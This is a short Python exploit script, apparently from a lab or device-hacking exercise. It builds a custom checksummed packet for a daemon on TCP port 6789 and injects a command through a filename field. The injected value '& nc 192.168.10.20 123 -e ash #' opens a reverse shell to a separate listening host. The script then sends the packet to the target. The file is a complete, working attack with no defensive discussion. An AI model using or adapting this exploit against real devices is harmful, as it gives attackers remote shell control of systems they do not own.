############################################################
# Script for triggering and exploiting a command injection #
# via port 6789 hosted by daemon process                   #
############################################################

import struct
import socket
from pwn import hexdump
import time

# create appended length and str part of payload
def create_str_and_len_bytestring(string):
    length = len(string)
    return struct.pack('<H', length) + string.encode('utf-8')

# Builds packet daemon can understand
def build_daemon_packet(filename_1, filename_2):
    payload = create_str_and_len_bytestring(filename_1) + create_str_and_len_bytestring(filename_2)

    # Calculate and pack the checksum as an unsigned short (2 bytes)
    checksum_bytes = sum(payload).to_bytes(2, byteorder='little')

    # Combine the payload and checksum
    daemon_packet = b'\x03\x00' + payload + checksum_bytes
    daemon_packet = len(daemon_packet).to_bytes(2, byteorder='little') + daemon_packet

    return daemon_packet

# Command injections
filename = "."
string1 = filename
string2 = f"{filename} & nc 192.168.10.20 123 -e ash #"

destination_ip = "192.168.10.1"
destination_port = 6789

# Create the payload manually
payload = build_daemon_packet(string1, string2)

print(hexdump(payload))

# Create a TCP socket
tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
tcp_socket.connect((destination_ip, destination_port))

# Send the payload over TCP
tcp_socket.send(payload)

# Optionally, you can wait for a response here if the server is expected to send one.
response = tcp_socket.recv(1024)
print(f"Received response: {response.decode()}")

time.sleep(1)

# Close the socket when done
tcp_socket.close()
